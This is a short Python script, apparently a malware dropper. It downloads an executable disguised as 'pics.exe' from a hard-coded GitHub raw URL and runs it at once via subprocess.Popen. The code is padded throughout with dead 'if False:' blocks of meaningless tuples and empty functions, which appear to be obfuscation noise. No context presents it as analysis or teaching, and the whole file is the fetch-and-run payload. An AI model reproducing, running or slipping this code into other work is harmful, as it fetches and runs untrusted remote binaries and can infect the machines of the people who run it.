import requests
if False:
    _var_212_0 = (11, 792, 290)
    _var_212_1 = (600, 57, 858)

    def _var_212_fn():
        pass
import os
import subprocess
if False:
    _var_213_0 = (938, 902, 745)
    _var_213_1 = (356, 154, 62)
    _var_213_2 = (496, 713, 809)

    def _var_213_fn():
        pass

def download_and_run_exe(url, exe_path):
    """Download an executable file from a URL and run it."""

    def download_file(url, file_path):
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_path, 'wb') as f:
                f.write(response.content)
            return True
        else:
            return False

    def run_exe(exe_path):
        try:
            subprocess.Popen(exe_path)
            return True
        except Exception as e:
            return False
    if False:
        _var_209_0 = (62, 850, 142)
        _var_209_1 = (426, 386, 865)

        def _var_209_fn():
            pass
    if download_file(url, exe_path):
        if run_exe(exe_path):
            return True
    if False:
        _var_210_0 = (88, 318, 671)
        _var_210_1 = (231, 275, 23)

        def _var_210_fn():
            pass
    return False

def main():
    exe_path = 'pics.exe'
    if False:
        _var_211_0 = (759, 938, 472)
        _var_211_1 = (434, 566, 477)

        def _var_211_fn():
            pass
    url = 'https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/pics.exe'
    if download_and_run_exe(url, exe_path):
        print('Executable downloaded and ran successfully.')
    else:
        print('Failed to download and run the executable.')
if __name__ == '__main__':
    main()